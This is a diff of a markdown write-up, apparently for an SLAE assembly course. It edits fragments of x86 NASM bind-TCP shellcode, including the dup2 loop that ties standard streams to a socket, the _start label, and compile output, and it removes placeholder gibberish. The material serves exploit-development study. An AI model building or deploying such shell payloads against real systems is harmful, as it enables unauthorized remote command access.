@@ -525,7 +525,9 @@ Whilst the zero flag is not set (JNZ) - the counter register is decremented each
 
 ```nasm
 	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR 
-	mov cl, 0x3     ; move 3 in the counter loop (stdin, stdout, stderr)     
+	mov cl, 0x3     ; move 3 in the counter loop (stdin, stdout, stderr)   
+	
+	loop_dup2:
  	xor eax, eax    ; clear register
    	mov al, 0x3f    ; move the dup2 syscall code into the lower part of eax
    	mov ebx, edi    ; move the new int sockfd (stored in edi) into ebx
@@ -667,10 +669,10 @@ Finally the execve syscall and the the program interrupt are called to execute t
 -------------
 
 ````nasm
-global_start
+global	_start
 
 section .text
-_start: 
+	_start: 
 
 	; initialize registers
 	xor eax, eax
@@ -717,7 +719,9 @@ _start:
 	mov edi, eax    ; save return value from eax into edi	
 	
 	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR 
-	mov cl, 0x3     ; move 3 in the counter loop (stdin, stdout, stderr)     
+	mov cl, 0x3     ; move 3 in the counter loop (stdin, stdout, stderr)   
+	
+	loop_dup2:
  	xor eax, eax    ; clear register
    	mov al, 0x3f    ; move the dup2 syscall code into the lower part of eax
    	mov ebx, edi    ; move the new int sockfd (stored in edi) into ebx
@@ -741,7 +745,7 @@ _start:
 
 #### POC (Assembly Code) 
 
-asdfsddsf
+...
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
@@ -755,7 +759,14 @@ ld -o $1 $1.o
 
 echo '[+] Done!'
 ```
-asfasdf
+...
+
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh shell_bind_tcp
+[+] Assembling with Nasm ... 
+[+] Linking ...
+[+] Done!
+```
 
 ##### SLAE Disclaimer ####
 ---------
